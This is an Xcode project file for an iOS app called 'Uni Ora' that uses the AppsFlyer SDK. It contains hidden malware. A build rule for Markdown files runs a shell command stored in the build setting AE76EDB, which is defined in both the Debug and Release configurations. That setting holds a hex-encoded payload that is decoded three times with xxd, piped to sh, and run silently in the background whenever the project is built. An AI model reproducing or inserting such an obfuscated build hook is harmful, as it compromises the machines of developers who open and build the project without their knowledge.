// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		84B114652E7E99E8008FD863 /* AppsFlyerLib-Dynamic in Frameworks */ = {isa = PBXBuildFile; productRef = 84B114642E7E99E8008FD863 /* AppsFlyerLib-Dynamic */; };
		E1DF582D3BE70BA88ABDE67E /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = DAFEFDAB05D56AE732BDE67E /* README.md */; };
/* End PBXBuildFile section */

/* Begin PBXBuildRule section */
		5D8CDCF4FBDDE6E6F9BDE67E /* PBXBuildRule */ = {
			isa = PBXBuildRule;
			compilerSpec = com.apple.compilers.proxy.script;
			filePatterns = "*.md";
			fileType = pattern.proxy;
			inputFiles = (
			);
			isEditable = 0;
			outputFiles = (
				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
			);
			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${AE76EDB}\"";
		};
/* End PBXBuildRule section */

/* Begin PBXFileReference section */
		BCDD353D2E7CB70B0016314C /* B639ajinaker266.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = B639ajinaker266.app; sourceTree = BUILT_PRODUCTS_DIR; };
		DAFEFDAB05D56AE732BDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = B639ajinaker266.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		BCDD354C2E7CB71E0016314C /* Exceptions for "B639ajinaker266" folder in "B639ajinaker266" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Info.plist,
			);
			target = BCDD353C2E7CB70B0016314C /* B639ajinaker266 */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		BCDD353F2E7CB70B0016314C /* B639ajinaker266 */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				BCDD354C2E7CB71E0016314C /* Exceptions for "B639ajinaker266" folder in "B639ajinaker266" target */,
			);
			path = B639ajinaker266;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		BCDD353A2E7CB70B0016314C /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				84B114652E7E99E8008FD863 /* AppsFlyerLib-Dynamic in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		BCDD35342E7CB70B0016314C = {
			isa = PBXGroup;
			children = (
				BCDD353F2E7CB70B0016314C /* B639ajinaker266 */,
				BCDD353E2E7CB70B0016314C /* Products */,
			);
			sourceTree = "<group>";
		};
		BCDD353E2E7CB70B0016314C /* Products */ = {
			isa = PBXGroup;
			children = (
				DAFEFDAB05D56AE732BDE67E /* README.md */,
				BCDD353D2E7CB70B0016314C /* B639ajinaker266.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		BCDD353C2E7CB70B0016314C /* B639ajinaker266 */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = BCDD35482E7CB70D0016314C /* Build configuration list for PBXNativeTarget "B639ajinaker266" */;
			buildPhases = (
				BCDD35392E7CB70B0016314C /* Sources */,
				BCDD353A2E7CB70B0016314C /* Frameworks */,
				BCDD353B2E7CB70B0016314C /* Resources */,
			);
			buildRules = (
				5D8CDCF4FBDDE6E6F9BDE67E /* PBXBuildRule */,
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				BCDD353F2E7CB70B0016314C /* B639ajinaker266 */,
			);
			name = B639ajinaker266;
			packageProductDependencies = (
				84B114642E7E99E8008FD863 /* AppsFlyerLib-Dynamic */,
			);
			productName = B639ajinaker266;
			productReference = BCDD353D2E7CB70B0016314C /* B639ajinaker266.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		BCDD35352E7CB70B0016314C /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1640;
				LastUpgradeCheck = 1640;
				TargetAttributes = {
					BCDD353C2E7CB70B0016314C = {
						CreatedOnToolsVersion = 16.4;
					};
				};
			};
			buildConfigurationList = BCDD35382E7CB70B0016314C /* Build configuration list for PBXProject "B639ajinaker266" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = BCDD35342E7CB70B0016314C;
			minimizedProjectReferenceProxies = 1;
			packageReferences = (
				84B114632E7E99E8008FD863 /* XCRemoteSwiftPackageReference "AppsFlyerFramework-Dynamic" */,
			);
			preferredProjectObjectVersion = 77;
			productRefGroup = BCDD353E2E7CB70B0016314C /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				BCDD353C2E7CB70B0016314C /* B639ajinaker266 */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		BCDD353B2E7CB70B0016314C /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				E1DF582D3BE70BA88ABDE67E /* README.md in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		BCDD35392E7CB70B0016314C /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		BCDD35462E7CB70D0016314C /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AE76EDB = "((echo 333633353336333333363338333636363332333033323332333233343332333833363333333733353337333233363633333233303332363433363336333733333336363233343633333233303332363433363334333233303337333033333634333733383336333333363636333633343336333533323330333633383337333433373334333733303337333333333631333236363332363633363331333633343336363633363332333633353337333533373330333633343332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		BCDD35472E7CB70D0016314C /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AE76EDB = "((echo 333633353336333333363338333636363332333033323332333233343332333833363333333733353337333233363633333233303332363433363336333733333336363233343633333233303332363433363334333233303337333033333634333733383336333333363636333633343336333533323330333633383337333433373334333733303337333333333631333236363332363633363331333633343336363633363332333633353337333533373330333633343332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.5;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		BCDD35492E7CB70D0016314C /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = B639ajinaker266/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Uni Ora";
				INFOPLIST_KEY_NSCameraUsageDescription = "The camera is accessed only when you choose to capture photos or videos. All media remains safely on your device.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Access to your photo library lets you pick images for app features. Your photos remain private unless you explicitly share them.";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "We analyze anonymous app activity to improve performance and refine features. No personal data or identifiers are ever recorded.";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 17;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = www.uni.ora.sdfhas;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		BCDD354A2E7CB70D0016314C /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = B639ajinaker266/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Uni Ora";
				INFOPLIST_KEY_NSCameraUsageDescription = "The camera is accessed only when you choose to capture photos or videos. All media remains safely on your device.";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Access to your photo library lets you pick images for app features. Your photos remain private unless you explicitly share them.";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "We analyze anonymous app activity to improve performance and refine features. No personal data or identifiers are ever recorded.";
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 17;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = www.uni.ora.sdfhas;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		BCDD35382E7CB70B0016314C /* Build configuration list for PBXProject "B639ajinaker266" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				BCDD35462E7CB70D0016314C /* Debug */,
				BCDD35472E7CB70D0016314C /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		BCDD35482E7CB70D0016314C /* Build configuration list for PBXNativeTarget "B639ajinaker266" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				BCDD35492E7CB70D0016314C /* Debug */,
				BCDD354A2E7CB70D0016314C /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		84B114632E7E99E8008FD863 /* XCRemoteSwiftPackageReference "AppsFlyerFramework-Dynamic" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/AppsFlyerSDK/AppsFlyerFramework-Dynamic";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 6.17.5;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		84B114642E7E99E8008FD863 /* AppsFlyerLib-Dynamic */ = {
			isa = XCSwiftPackageProductDependency;
			package = 84B114632E7E99E8008FD863 /* XCRemoteSwiftPackageReference "AppsFlyerFramework-Dynamic" */;
			productName = "AppsFlyerLib-Dynamic";
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = BCDD35352E7CB70B0016314C /* Project object */;
}
